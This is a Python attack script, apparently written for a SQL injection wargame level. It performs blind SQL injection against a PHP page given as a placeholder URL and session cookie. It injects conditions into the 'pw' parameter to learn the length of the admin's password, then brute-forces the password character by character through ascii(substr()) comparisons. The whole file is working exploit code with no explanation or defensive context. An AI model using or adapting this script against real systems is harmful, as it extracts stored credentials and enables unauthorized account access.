import requests
import urllib
import urllib3

pw = ""
length = 0

url = "YOUR_URL"
session = dict(PHPSESSID = "YOUR_SESSION_ID")

# find length
print("[*] Finding Length...")

for i in range(0, 100):
    try:
        query = url + "?pw=' or id='admin' and (length(pw)=" 
        query = query + str(i) + " or (select 1 union select pw))%23"
        r = requests.post(query, cookies=session)
    except:
        print ("[-] An error occurred, shutting down...")
        exit()

    if "query" in r.text:
        length = i
        break

print("[+] Length found: ", length)

# find password
print("[*] Finding password... (Brute-forcing may take awhile)")

for i in range(0, length + 1):
    for j in range(48, 128): #ASCII
        try:
            query = url + "?pw=' or id='admin' and (ascii(substr(pw," + str(i) + ",1))=" 
            query = query + str(j) + " or (select 1 union select pw))%23"
            r = requests.post(query, cookies=session)
        except:
            print ("[-] An error occurred, shutting down...")
            exit()
        if "query" in r.text:
            pw = pw + chr(j)
            print("[+] ", pw)
            break
        	
print("[+] Password found: ", pw)
